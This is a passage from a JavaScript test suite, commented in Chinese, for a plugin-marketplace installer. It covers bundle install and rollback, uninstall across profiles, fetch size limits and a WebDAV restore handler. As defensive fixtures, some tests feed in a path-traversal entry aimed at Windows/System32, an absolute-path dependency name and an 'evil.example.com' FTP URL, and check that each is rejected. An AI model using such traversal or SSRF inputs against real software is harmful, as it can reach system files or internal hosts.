      // fixture：bundle 声明包（dsh.bundle.patch + 空操作入口，与 @linxin666/dsh-web-ui-all 同形态）
      // 场景 A：npm 等价回退来源（npmTarget 有值）→ 依赖声明用精确版本
      const fix = makeFixture("fake-bundle-pkg", "1.2.3", true);
      const logLines = [];
      const result = await lib.installRepo({
        type: "cordis-plugin", cacheDir: fix, repo: "fake/bundle-repo", log: [],
        answers: {}, logLine: (l) => logLines.push(l), lang: "zh", envAllowList: [],
        npmTarget: "@fake/bundle-pkg",
      });
      const profPkg = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("bundle 注册写入 profile dependencies（精确版本）", profPkg.dependencies["fake-bundle-pkg"], "1.2.3");
      check("bundle 注册追加 dsh.profile.bundles（保留既有条目）", profPkg.dsh.profile.bundles.join(","), "dsh-plugin-marketplace,fake-bundle-pkg");
      check("bundle 注册不写 cordis.patch.yml insert", !existsSync(join(web, "cordis.patch.yml")) || !readFileSync(join(web, "cordis.patch.yml"), "utf8").includes("fake-bundle-pkg"), true);
      check("bundle 安装结果带 bundle 标志", result.bundle, true);
      check("bundle 安装 location 指向 profile 解析目录", String(result.location).endsWith(join("node_modules", "fake-bundle-pkg")), true);
      check("bundle 注册日志含 pnpm install 步骤", logLines.some((l) => l.includes("pnpm install")), true);

      // 场景 D：仓库克隆来源（npmTarget 为空，如 dsh-theme-endfield 只发 GitHub）→ github: 声明
      const fixD = makeFixture("fake-bundle-d", "1.2.6", true);
      const logD = [];
      const resultD = await lib.installRepo({
        type: "cordis-plugin", cacheDir: fixD, repo: "fake/bundle-repo-d", log: [],
        answers: {}, logLine: (l) => logD.push(l), lang: "zh", envAllowList: [],
      });
      const profD = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("仓库来源 bundle 依赖声明 github: 形态", profD.dependencies["fake-bundle-d"], "github:fake/bundle-repo-d");
      check("仓库来源 bundle 注册成功", resultD.bundle, true);

      // 旧路径（type=cordis-plugin）bundle + entry 缺失 → 同样拦截（registerBundlePackage 共享校验）
      writeFileSync(join(stubDir, "entry"), "lib/index.js", "utf8");
      const fixL = makeFixture("fake-bundle-l", "1.3.4", true);
      let thrownL = null;
      try {
        await lib.installRepo({
          type: "cordis-plugin", cacheDir: fixL, repo: "fake/bundle-repo-l", log: [],
          answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
        });
      } catch (error) {
        thrownL = String(error?.message ?? error);
      }
      check("旧路径 bundle + entry 缺失 → 拦截（共享校验）", /加载入口/.test(thrownL ?? ""), true);
      const profAfterL = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("旧路径 entry 拦截 → manifest 回滚", profAfterL.dependencies["fake-bundle-l"], undefined);
      rmSync(join(stubDir, "entry"), { force: true });

      // 结果导向：pnpm 退出非零但包已可解析 → 成功 + 告警（不伪装失败也不忽略告警）
      writeFileSync(join(stubDir, "mode"), "fail-create", "utf8");
      const fixB = makeFixture("fake-bundle-b", "1.2.4", true);
      const logB = [];
      const resultB = await lib.installRepo({
        type: "cordis-plugin", cacheDir: fixB, repo: "fake/bundle-repo-b", log: [],
        answers: {}, logLine: (l) => logB.push(l), lang: "zh", envAllowList: [],
      });
      check("pnpm 非零退出但包可解析 → 结果导向成功", resultB.bundle, true);
      check("pnpm 非零退出但包可解析 → 告警日志", logB.some((l) => l.includes("以非零状态退出")), true);

      // pnpm 未完成安装（包不可解析）→ 明示失败（bundleResolveFail），不伪装成功
      writeFileSync(join(stubDir, "mode"), "fail-nocreate", "utf8");
      const fixC = makeFixture("fake-bundle-c", "1.2.5", true);
      let thrownC = null;
      try {
        await lib.installRepo({
          type: "cordis-plugin", cacheDir: fixC, repo: "fake/bundle-repo-c", log: [],
          answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
        });
      } catch (error) {
        thrownC = String(error?.message ?? error);
      }
      check("pnpm 未完成安装 → bundleResolveFail 明示失败", /仍未在 profile node_modules 解析到/.test(thrownC ?? ""), true);
      // B：失败后 manifest 回滚（写前快照恢复）——dependencies/bundles 不含 fake-bundle-c
      const profAfterC = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("B 失败回滚 → dependencies 不含失败包", profAfterC.dependencies["fake-bundle-c"], undefined);
      check("B 失败回滚 → bundles 不含失败包", (profAfterC.dsh.profile.bundles ?? []).includes("fake-bundle-c"), false);
      writeFileSync(join(stubDir, "mode"), "", "utf8");

      // B：依赖解析失败回滚——stub 创建的包声明不存在的子依赖 → bundleRequire.resolve 失败
      // → bundleDepsResolveFail + manifest 回滚
      writeFileSync(join(stubDir, "entry"), JSON.stringify({ main: "lib/index.js", deps: { "@fake/missing-dep": "1.0.0" } }), "utf8");
      const fixK = makeFixture("fake-bundle-k", "1.3.3", true);
      let thrownK = null;
      try {
        await lib.installRepo({
          type: "bundle", cacheDir: fixK, repo: "fake/bundle-repo-k", log: [],
          answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
        });
      } catch (error) {
        thrownK = String(error?.message ?? error);
      }
      check("B 子依赖解析失败 → bundleDepsResolveFail 明示", /子依赖|sub-dependencies/.test(thrownK ?? ""), true);
      const profAfterK = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("B 子依赖失败回滚 → dependencies 不含失败包", profAfterK.dependencies["fake-bundle-k"], undefined);
      check("B 子依赖失败回滚 → bundles 不含失败包", (profAfterK.dsh.profile.bundles ?? []).includes("fake-bundle-k"), false);
      rmSync(join(stubDir, "entry"), { force: true });

      // main 路径穿越（../../ 逃逸）→ 拒绝（不得 exists 探测外部路径）
      writeFileSync(join(stubDir, "entry"), "../../../../../../Windows/System32/notepad.exe", "utf8");
      const fixM = makeFixture("fake-bundle-m", "1.3.5", true);
      let thrownM = null;
      try {
        await lib.installRepo({
          type: "bundle", cacheDir: fixM, repo: "fake/bundle-repo-m", log: [],
          answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
        });
      } catch (error) {
        thrownM = String(error?.message ?? error);
      }
      check("边界1 main 路径穿越 → 拒绝", /穿越|越界|traversal|越界/.test(thrownM ?? ""), true);
      const profAfterM = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("边界1 main 穿越 → manifest 回滚", profAfterM.dependencies["fake-bundle-m"], undefined);
      rmSync(join(stubDir, "entry"), { force: true });

      // 依赖名含绝对路径（C:/Windows/...）→ 拒绝（不得 resolve 外部文件）
      writeFileSync(join(stubDir, "entry"), JSON.stringify({ main: "lib/index.js", deps: { "C:/Windows/System32/notepad.exe": "1.0.0" } }), "utf8");
      const fixN = makeFixture("fake-bundle-n", "1.3.6", true);
      let thrownN = null;
      try {
        await lib.installRepo({
          type: "bundle", cacheDir: fixN, repo: "fake/bundle-repo-n", log: [],
          answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
        });
      } catch (error) {
        thrownN = String(error?.message ?? error);
      }
      check("边界2 依赖名绝对路径 → 拒绝", /非法|invalid|依赖名|穿越/.test(thrownN ?? ""), true);
      const profAfterN = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("边界2 依赖名绝对路径 → manifest 回滚", profAfterN.dependencies["fake-bundle-n"], undefined);
      rmSync(join(stubDir, "entry"), { force: true });

      // 卸载：补一条 bundle 安装记录后经 handler 全链路（pnpm remove 清理 manifest + 目录）
      await lib.saveInstalled("fake/bundle-repo", {
        type: "cordis-plugin", name: "fake-bundle-pkg", names: ["fake-bundle-pkg"],
        location: join(web, "node_modules", "fake-bundle-pkg"), version: "1.2.3",
        bundle: true, installedAt: Date.now(), envKeys: null,
      });
      const registered2 = [];
      lib.apply({ get: (s) => (s === "webServer" ? { register: (r) => registered2.push(r) } : undefined), logger: { warn: () => {} }, slots: { inject: () => {} } });
      const uninstallHandler = registered2.find((r) => r.path === "/api/marketplace/uninstall")?.handler;
      const bodyStr = JSON.stringify({ repo: "fake/bundle-repo" });
      let sent = false;
      const unReq = {
        method: "POST",
        headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
        socket: { remoteAddress: "127.0.0.1" },
        url: "/api/marketplace/uninstall",
        [Symbol.asyncIterator]() {
          return { next: async () => (sent ? { value: undefined, done: true } : ((sent = true), { value: Buffer.from(bodyStr), done: false })) };
        },
      };
      let uStatus = 0, uBody = null;
      await uninstallHandler(unReq, { writeHead: (x) => { uStatus = x; }, end: (x) => { try { uBody = JSON.parse(x); } catch { uBody = null; } } });
      const profAfter = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("bundle 卸载响应 200 done", uStatus === 200 && uBody?.status, "done");
      check("bundle 卸载移除 profile dependencies", profAfter.dependencies["fake-bundle-pkg"], undefined);
      check("bundle 卸载移除 dsh.profile.bundles 条目", profAfter.dsh.profile.bundles.join(","), "dsh-plugin-marketplace,fake-bundle-d,fake-bundle-b");
      check("bundle 卸载删除包目录", existsSync(join(web, "node_modules", "fake-bundle-pkg")), false);

      // 卸载降级路径（覆盖率 L4007）：pnpm remove 失败 → 手工清理 profile 条目 + 目录
      writeFileSync(join(stubDir, "mode"), "fail-remove", "utf8");
      await lib.saveInstalled("fake/bundle-repo-g", {
        type: "bundle", name: "fake-bundle-g", names: ["fake-bundle-g"],
        location: join(web, "node_modules", "fake-bundle-g"), version: "1.2.9",
        bundle: true, installedAt: Date.now(), envKeys: null,
      });
      // 先注册到 manifest（手工清理路径读取它）
      const profG = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      profG.dependencies["fake-bundle-g"] = "1.2.9";
      if (!(profG.dsh.profile.bundles ?? []).includes("fake-bundle-g")) profG.dsh.profile.bundles.push("fake-bundle-g");
      writeFileSync(join(web, "package.json"), JSON.stringify(profG, null, 2), "utf8");
      const registeredG = [];
      lib.apply({ get: (s) => (s === "webServer" ? { register: (r) => registeredG.push(r) } : undefined), logger: { warn: () => {} }, slots: { inject: () => {} } });
      const uninstallG = registeredG.find((r) => r.path === "/api/marketplace/uninstall")?.handler;
      let sentG = false;
      const unReqG = {
        method: "POST",
        headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
        socket: { remoteAddress: "127.0.0.1" },
        url: "/api/marketplace/uninstall",
        [Symbol.asyncIterator]() {
          return { next: async () => (sentG ? { value: undefined, done: true } : ((sentG = true), { value: Buffer.from(JSON.stringify({ repo: "fake/bundle-repo-g" })), done: false })) };
        },
      };
      let uStatusG = 0;
      await uninstallG(unReqG, { writeHead: (x) => { uStatusG = x; }, end: () => {} });
      const profAfterG = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("pnpm remove 失败 → 手工清理移除 dependencies", profAfterG.dependencies["fake-bundle-g"], undefined);
      check("pnpm remove 失败 → 手工清理移除 bundles 条目", (profAfterG.dsh.profile.bundles ?? []).includes("fake-bundle-g"), false);
      check("pnpm remove 失败 → 手工清理删除包目录", existsSync(join(web, "node_modules", "fake-bundle-g")), false);
      // 覆盖率 L4007：writeProfileManifest 写失败 → catch 吞错（不影响目录删除兜底）
      // 先构造 manifest 有依赖 + 目录存在，再把 manifest 设为只读 → 手工清理写回失败
      const profRO = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      profRO.dependencies["fake-bundle-ro"] = "1.3.0";
      if (!(profRO.dsh.profile.bundles ?? []).includes("fake-bundle-ro")) profRO.dsh.profile.bundles.push("fake-bundle-ro");
      writeFileSync(join(web, "package.json"), JSON.stringify(profRO, null, 2), "utf8");
      mkdirSync(join(web, "node_modules", "fake-bundle-ro"), { recursive: true });
      writeFileSync(join(web, "node_modules", "fake-bundle-ro", "package.json"), JSON.stringify({ name: "fake-bundle-ro", version: "1.3.0" }), "utf8");
      await lib.saveInstalled("fake/bundle-repo-ro", {
        type: "bundle", name: "fake-bundle-ro", names: ["fake-bundle-ro"],
        location: join(web, "node_modules", "fake-bundle-ro"), version: "1.3.0",
        bundle: true, installedAt: Date.now(), envKeys: null,
      });
      chmodSync(join(web, "package.json"), 0o444); // 只读：writeProfileManifest 抛错 → catch 吞
      const registeredRO = [];
      lib.apply({ get: (s) => (s === "webServer" ? { register: (r) => registeredRO.push(r) } : undefined), logger: { warn: () => {} }, slots: { inject: () => {} } });
      const uninstallRO = registeredRO.find((r) => r.path === "/api/marketplace/uninstall")?.handler;
      let sentRO = false;
      const unReqRO = {
        method: "POST",
        headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
        socket: { remoteAddress: "127.0.0.1" },
        url: "/api/marketplace/uninstall",
        [Symbol.asyncIterator]() {
          return { next: async () => (sentRO ? { value: undefined, done: true } : ((sentRO = true), { value: Buffer.from(JSON.stringify({ repo: "fake/bundle-repo-ro" })), done: false })) };
        },
      };
      let uStatusRO = 0;
      await uninstallRO(unReqRO, { writeHead: (x) => { uStatusRO = x; }, end: () => {} });
      chmodSync(join(web, "package.json"), 0o644); // 恢复可写（finally 路径清理依赖）
      check("写回失败被 catch 吞（目录删除兜底仍执行）", existsSync(join(web, "node_modules", "fake-bundle-ro")), false);
      writeFileSync(join(stubDir, "mode"), "", "utf8");

      // 跨 profile 卸载（issue #184 边界）：targetProfile 切到 desktop 后，卸载
      // 安装记录仍指向 web 的插件——必须按 record.location 定位真实落点删除，
      // 而非在 desktop 的 node_modules 下按包名拼路径（rm force:true 静默残留）。
      {
        mkdirSync(join(process.env.DSH_HOME, "profiles", "desktop", "node_modules"), { recursive: true });
        const legacyPkg = join(web, "node_modules", "legacy-web-plugin");
        mkdirSync(legacyPkg, { recursive: true });
        writeFileSync(join(legacyPkg, "package.json"), JSON.stringify({ name: "legacy-web-plugin", version: "0.9.0" }), "utf8");
        await lib.saveInstalled("fake/legacy-repo", {
          type: "cordis-plugin", name: "legacy-web-plugin", names: ["legacy-web-plugin"],
          location: legacyPkg, version: "0.9.0", installedAt: Date.now(), envKeys: null,
        });
        // K2 回归：旧 profile 的 cordis.patch.yml 条目必须被清理（而非当前 profile 的文件）
        const webPatch = join(web, "cordis.patch.yml");
        writeFileSync(webPatch, "[]\n- insert:\n    id: mp-legacy\n    name: \"legacy-web-plugin\"\n", "utf8");
        lib.setTargetProfile("desktop");
        try {
          const registeredX = [];
          lib.apply({ get: (s) => (s === "webServer" ? { register: (r) => registeredX.push(r) } : undefined), logger: { warn: () => {} }, slots: { inject: () => {} } });
          const uninstallX = registeredX.find((r) => r.path === "/api/marketplace/uninstall")?.handler;
          let sentX = false;
          const unReqX = {
            method: "POST",
            headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
            socket: { remoteAddress: "127.0.0.1" },
            url: "/api/marketplace/uninstall",
            [Symbol.asyncIterator]() {
              return { next: async () => (sentX ? { value: undefined, done: true } : ((sentX = true), { value: Buffer.from(JSON.stringify({ repo: "fake/legacy-repo" })), done: false })) };
            },
          };
          let uStatusX = 0;
          let uBodyX = null;
          await uninstallX(unReqX, { writeHead: (x) => { uStatusX = x; }, end: (b) => { try { uBodyX = JSON.parse(b); } catch { uBodyX = null; } } });
          check("跨 profile 卸载响应 done", [uStatusX === 200, uBodyX?.status], [true, "done"]);
          check("跨 profile 卸载删除旧 profile 实体目录", existsSync(legacyPkg), false);
          check("跨 profile 卸载不误删当前 profile 目录", existsSync(join(process.env.DSH_HOME, "profiles", "desktop", "node_modules")), true);
          check("跨 profile 卸载移除安装记录", lib.hasInstalledRecord("fake/legacy-repo"), false);
          const webPatchAfter = readFileSync(webPatch, "utf8");
          check("跨 profile 卸载清理旧 profile patch 条目", webPatchAfter.includes("legacy-web-plugin"), false);
        } finally {
          lib.setTargetProfile("web");
        }
      }

      // K22 回归：无 names 字段的旧记录（name 为 -plugins 结尾的仓库目录名，L5 防呆
      // 放弃 name）跨 profile 卸载——targets 推断必须按 recordNm 锚点定位。修复前用
      // 当前 PROFILE_NM 判断，跨 profile 时 location 在旧 profile → 条件 false →
      // targets 空 → 走 uninstallNoTargets → 记录删除但目录/patch 残留（孤儿态）。
      {
        const legacyPkg = join(web, "node_modules", "real-pkg");
        mkdirSync(legacyPkg, { recursive: true });
        writeFileSync(join(legacyPkg, "package.json"), JSON.stringify({ name: "real-pkg", version: "0.5.0" }), "utf8");
        await lib.saveInstalled("fake/legacy-no-names", {
          type: "cordis-plugin", name: "legacy-plugins",
          location: legacyPkg, version: "0.5.0", installedAt: Date.now(), envKeys: null,
        });
        lib.setTargetProfile("desktop");
        try {
          const registeredK = [];
          lib.apply({ get: (s) => (s === "webServer" ? { register: (r) => registeredK.push(r) } : undefined), logger: { warn: () => {} }, slots: { inject: () => {} } });
          const uninstallK = registeredK.find((r) => r.path === "/api/marketplace/uninstall")?.handler;
          let sentK = false;
          const unReqK = {
            method: "POST",
            headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
            socket: { remoteAddress: "127.0.0.1" },
            url: "/api/marketplace/uninstall",
            [Symbol.asyncIterator]() {
              return { next: async () => (sentK ? { value: undefined, done: true } : ((sentK = true), { value: Buffer.from(JSON.stringify({ repo: "fake/legacy-no-names" })), done: false })) };
            },
          };
          let uStatusK = 0;
          let uBodyK = null;
          await uninstallK(unReqK, { writeHead: (x) => { uStatusK = x; }, end: (b) => { try { uBodyK = JSON.parse(b); } catch { uBodyK = null; } } });
          check("K22 无 names 旧记录跨 profile 卸载响应 done", [uStatusK === 200, uBodyK?.status], [true, "done"]);
          check("K22 无 names 旧记录实体目录已删", existsSync(legacyPkg), false);
          check("K22 卸载移除安装记录", lib.hasInstalledRecord("fake/legacy-no-names"), false);
        } finally {
          lib.setTargetProfile("web");
        }
      }

      // detectType 判 bundle 后的独立安装路径（type=bundle 直接走 registerBundlePackage）
      const fixE = makeFixture("fake-bundle-e", "1.2.7", true);
      const logE = [];
      const resultE = await lib.installRepo({
        type: "bundle", cacheDir: fixE, repo: "fake/bundle-repo-e", log: [],
        answers: {}, logLine: (l) => logE.push(l), lang: "zh", envAllowList: [],
      });
      const profE = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("type=bundle 安装走 registerBundlePackage（仓库来源 github: 声明）", profE.dependencies["fake-bundle-e"], "github:fake/bundle-repo-e");
      check("type=bundle 安装结果带 bundle 标志", resultE.bundle, true);
      check("type=bundle 安装结果 type 为 bundle", resultE.type, "bundle");
      check("type=bundle 安装结果无 count（客户端 count>1 分支 undefined 兜底）", resultE.count, undefined);
      // B：entry 校验（#146 型）——bundle 包 main 指向缺失文件（lib/ 未构建）→ 安装后 entry 校验拦截
      const fixH = makeFixture("fake-bundle-h", "1.3.1", true);
      const logH = [];
      const resultH = await lib.installRepo({
        type: "bundle", cacheDir: fixH, repo: "fake/bundle-repo-h", log: [],
        answers: {}, logLine: (l) => logH.push(l), lang: "zh", envAllowList: [],
      });
      // stub 写入的 fake-bundle-h package.json 无 main 声明（stub 只写 name/version）
      // → entry 校验应 pass（无 main 不拦截）；用带 main 的 fixture 走 installRepo 验证校验
      check("type=bundle 无 main 声明 → 安装成功（entry 校验不拦截）", resultH.bundle, true);
      // entry 缺失拦截：#146 型——stub 创建带 main 的包（entry 模式）但无产物 → 拦截 + 回滚
      writeFileSync(join(stubDir, "entry"), "lib/index.js", "utf8");
      const fixI = makeFixture("fake-bundle-i", "1.3.2", true);
      let thrownI = null;
      try {
        await lib.installRepo({
          type: "bundle", cacheDir: fixI, repo: "fake/bundle-repo-i", log: [],
          answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
        });
      } catch (error) {
        thrownI = String(error?.message ?? error);
      }
      check("entry 缺失（main 指向不存在文件）→ 拦截", /加载入口/.test(thrownI ?? ""), true);
      const profAfterI = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("entry 拦截后 manifest 回滚（dependencies 无 fake-bundle-i）", profAfterI.dependencies["fake-bundle-i"], undefined);
      check("entry 拦截后 bundles 回滚（无 fake-bundle-i）", (profAfterI.dsh.profile.bundles ?? []).includes("fake-bundle-i"), false);
      check("entry 拦截后包目录已删", existsSync(join(web, "node_modules", "fake-bundle-i")), false);
      rmSync(join(stubDir, "entry"), { force: true });      check("type=bundle 安装日志含 bundleDetected", logE.some((l) => l.includes("bundle 形态")), true);
      // type=bundle 但包实际非 bundle 声明 → 明示失败（防御：detectType 与 installRepo 判定漂移）
      const fixF = makeFixture("fake-bundle-f", "1.2.8", false);
      let thrownF = null;
      try {
        await lib.installRepo({
          type: "bundle", cacheDir: fixF, repo: "fake/bundle-repo-f", log: [],
          answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
        });
      } catch (error) {
        thrownF = String(error?.message ?? error);
      }
      check("type=bundle 但非 bundle 声明 → 拒绝（防判定漂移）", /拒绝安装|bundle/.test(thrownF ?? ""), true);

      // 回归：非 bundle 插件仍走复制 + patch insert（原路径不受影响）
      const plainFix = makeFixture("fake-plain-pkg", "0.0.1", false);
      const plainResult = await lib.installRepo({
        type: "cordis-plugin", cacheDir: plainFix, repo: "fake/plain-repo", log: [],
        answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
      });
      const profBeforePlain = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
      check("非 bundle 插件不写 profile dependencies", profBeforePlain.dependencies["fake-plain-pkg"], undefined);
      check("非 bundle 插件结果无 bundle 标志", plainResult.bundle, false);
      check("非 bundle 插件写入 cordis.patch.yml insert", readFileSync(join(web, "cordis.patch.yml"), "utf8").includes("fake-plain-pkg"), true);
    } finally {
      process.env.PATH = savedPath;
      rmSync(stubDir, { recursive: true, force: true });
    }
  }

  // 网络类（mock fetch）
  const items = [{ full_name: "a/b", stargazers_count: 5, updated_at: "2026-01-01T00:00:00Z", description: "x", html_url: "https://github.com/a/b", clone_url: "https://github.com/a/b.git" }];
  const orig1 = mockFetch({ items, total_count: 1 });
  const list = await lib.getList("dsh", true);
  globalThis.fetch = orig1;
  check("getList mock 数组", Array.isArray(list), true);

  // fetchAllRepos
  const orig2 = mockFetch({ items, total_count: 1 });
  const all = await lib.fetchAllRepos();
  globalThis.fetch = orig2;
  check("fetchAllRepos 数组", Array.isArray(all), true);

  // fetchRegistryRepos（registry 结构: { repos: [], generated_at }）
  const registryPayload = { repos: [{ full_name: "a/b", stargazers_count: 5, updated_at: "2026-01-01T00:00:00Z", description: "x", html_url: "https://github.com/a/b" }], generated_at: new Date().toISOString() };
  const orig3 = mockFetch(registryPayload);
  const reg = await lib.fetchRegistryRepos("dsh");
  globalThis.fetch = orig3;
  check("fetchRegistryRepos 数组", Array.isArray(reg), true);

  // ---- L6 流式计数：chunked（无 content-length）时 32MB 上限不被绕过 ----
  // json()/arrayBuffer()/text() 会把整个 body 读入内存——修复前 chunked 响应
  // 直接信任读取（安全守卫契约见 unit/security-guards.test.mjs 的 L6 段）。
  // mock 响应只有 body 流（headers.get 恒 null = 无 content-length）：
  // 正常 chunk 读完 → .gz 源解析成功；超 32MB → 流式拦截 → 换下一源 → 全超限 null。
  {
    const { gzipSync } = await import("node:zlib");
    const gzBuf = gzipSync(Buffer.from(JSON.stringify(registryPayload)));
    const chunkedRes = (chunks) => ({
      ok: true, status: 200,
      headers: { get: () => null },
      body: {
        getReader: () => {
          let i = 0;
          return {
            read: async () => (i < chunks.length ? { done: false, value: Buffer.from(chunks[i++]) } : { done: true, value: undefined }),
            cancel: async () => {},
          };
        },
      },
    });
    const orig4 = globalThis.fetch;
    const half = Math.ceil(gzBuf.length / 2);
    globalThis.fetch = async () => chunkedRes([gzBuf.subarray(0, half), gzBuf.subarray(half)]);
    const gzReg = await lib.fetchRegistryRepos("dsh");
    globalThis.fetch = orig4;
    check("chunked .gz 流式读取正常解析", Array.isArray(gzReg) && gzReg.length > 0, true);
    const orig6 = globalThis.fetch;
    const big = Buffer.alloc(33 * 1024 * 1024, 0x61);
    globalThis.fetch = async () => chunkedRes([big]);
    const over = await lib.fetchRegistryRepos("dsh");
    globalThis.fetch = orig6;
    check("chunked 超 32MB 流式拦截（换源后 null）", over === null, true);
  }

  // fetchJson 错误路径（fetchJson 未导出，经 fetchAllRepos 内部触发）：
  // 所有 registry 源返回 403 → （内置索引存在会先兜底，#12——临时移开以覆盖
  // 更深层路径）→ 磁盘缓存（清空）→ 搜索 API → fetchJson 抛错被捕获（含
  // res.text() 失败时的 .catch(() => "") 分支）→ 降级返回空数组。
  const bundledDsh = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "registry.json");
  renameSync(bundledDsh, bundledDsh + ".bak");
  try {
    // 前文 fetchAllRepos 的内置索引兜底会 fire-and-forget 落盘 list-cache/dsh.json，
    // 先等其写完再清空，否则磁盘缓存层会先命中、覆盖不了搜索兜底路径。
    await new Promise((r) => setTimeout(r, 500));
    rmSync(join(process.env.DSH_HOME, "marketplace", "list-cache", "dsh.json"), { force: true });
    const orig5 = globalThis.fetch;
    globalThis.fetch = async () => ({ ok: false, status: 403, json: async () => ({}), text: async () => { throw new Error("text boom"); } });
    const degraded = await lib.fetchAllRepos("dsh");
    globalThis.fetch = orig5;
    check("fetchAllRepos 全失败降级空数组", Array.isArray(degraded) && degraded.length === 0, true);
  } finally {
    renameSync(bundledDsh + ".bak", bundledDsh);
  }

  // apply(ctx) mock：验证路由注册（install handler 依赖真实 git/npm 子进程，属 e2e 覆盖）
  let registered = [];
  const fakeCtx = {
    get: (s) => (s === "webServer" ? { register: (r) => registered.push(r) } : undefined),
    logger: { warn: () => {} },
    slots: { inject: () => {} },
  };
  lib.apply(fakeCtx);
  check("apply 注册路由", registered.length > 0, true);
  check("apply 注册 install 路由", registered.some((r) => r.path === "/api/marketplace/install"), true);
  check("apply 注册 skills 路由", registered.some((r) => r.path === "/api/marketplace/skills"), true);

  // ---- 执行边界行为验证：MAX_EXEC_BUFFER（32MB）vs execFile 默认 1MB ----
  // 安装/更新链的 execFile 输出上限：2MB 输出在默认 maxBuffer(1MB) 下必炸
  // （ERR_CHILD_PROCESS_STDIO_MAXBUFFER——npm install 常见触发），32MB 下正常。
  // 证明常量选择的行为依据（契约断言见 unit/security-guards.test.mjs）。
  const { execFile } = await import("node:child_process");
  const execFileP = (await import("node:util")).promisify(execFile);
  const boomScript = "process.stdout.write('x'.repeat(2 * 1024 * 1024))";
  const defaultFails = await execFileP(process.execPath, ["-e", boomScript], { maxBuffer: 1024 * 1024 })
    .then(() => false).catch((e) => /MAXBUFFER/i.test(String(e?.code ?? "")));
  check("2MB 输出在默认 1MB maxBuffer 下炸（行为前提）", defaultFails, true);
  const bigOk = await execFileP(process.execPath, ["-e", boomScript], { maxBuffer: 32 * 1024 * 1024 })
    .then(() => true).catch(() => false);
  check("2MB 输出在 32MB maxBuffer 下正常（MAX_EXEC_BUFFER 依据）", bigOk, true);

  // ---- restore/webdav handler：WebDAV 拉取备份 → 恢复差异 ----
  // 整条 handler 补测（此前无任何测试触发）：405 / 非法 URL / fetch 失败 / 成功 diff / 非法 backup。
  const restoreWdHandler = registered.find((h) => h.path === "/api/marketplace/restore/webdav")?.handler;
  if (restoreWdHandler) {
    const mkPostReq = (bodyObj) => {
      const bodyStr = JSON.stringify(bodyObj);
      let sent = false;
      return {
        method: "POST",
        headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
        // 审查 S1：写端点升级 isWriteAllowed 后，mock req 需回环 socket 地址（连接层判定）
        socket: { remoteAddress: "127.0.0.1" },
        url: "/api/marketplace/restore/webdav",
        [Symbol.asyncIterator]() {
          return {
            next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(bodyStr), done: false }),
          };
        },
      };
    };
    const call = async (req) => {
      let s = 0, b = null;
      await restoreWdHandler(req, { writeHead: (x) => { s = x; }, end: (x) => { try { b = JSON.parse(x); } catch { b = null; } } });
      return { s, b };
    };
    // 方法非 POST → 405
    let r = await call({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" } });
    check("restore/webdav 非 POST 405", r.s, 405);
    // 非法协议 URL（非 http/https，防 SSRF）→ 400
    r = await call(mkPostReq({ url: "ftp://evil.example.com/bk.json" }));
    check("restore/webdav 非法 URL 400", r.s, 400);
    // 远端 fetch 失败（HTTP 500）→ 200 failed + webdavFail 日志
    const origFail = mockFetch({}, 500);
    r = await call(mkPostReq({ url: "https://example.com/bk.json" }));
    globalThis.fetch = origFail;
    check("restore/webdav fetch 失败 failed", r.s, 200);
    check("restore/webdav fetch 失败 status=failed", r.b && r.b.status, "failed");
    // 成功：合法 backup（1 条未装 + 1 条已装，触发 missing/already 两个 map 回调）→ 200 done
    const origOk = mockFetch({ repos: [
      { repo: "none/not-installed", type: "skill", name: "x" },
      { repo: "none/already-installed", type: "skill", name: "y" },
    ] });
    r = await call(mkPostReq({ url: "https://example.com/bk.json", username: "u", password: "p" }));
    globalThis.fetch = origOk;
    check("restore/webdav 成功 200", r.s, 200);
    check("restore/webdav missing 未装项", r.b && r.b.missing, ["none/not-installed"]);
    check("restore/webdav already 已装项", r.b && r.b.already, ["none/already-installed"]);
    // 远端返回非法 backup 结构 → 400 badBackup
    const origBad = mockFetch({ repos: "nope" });
    r = await call(mkPostReq({ url: "https://example.com/bk.json" }));
    globalThis.fetch = origBad;
    check("restore/webdav badBackup 400", r.s, 400);
  } else {
    check("restore/webdav handler 存在", false, true);
  }

  // ---- feedback：GitHub 自动建 issue（doCreate 闭包——token 已配置 + fetch mock）----
  // e2e 已覆盖无 token 的 manualUrl 分支；此处补 token 分支：422 label 重试 + 成功创建。
  const fbSubmit = registered.find((h) => h.path === "/api/marketplace/feedback")?.handler;
  const fbToken = registered.find((h) => h.path === "/api/marketplace/feedback/token")?.handler;
  if (fbSubmit && fbToken) {
    await new Promise((r) => setTimeout(r, 50)); // 等 apply 里 loadFeedback 异步读盘完成
    const fbCall = async (handler, body) => {
      const bodyStr = JSON.stringify(body ?? {});
      let sent = false;
      const req = {
        method: "POST",
        headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
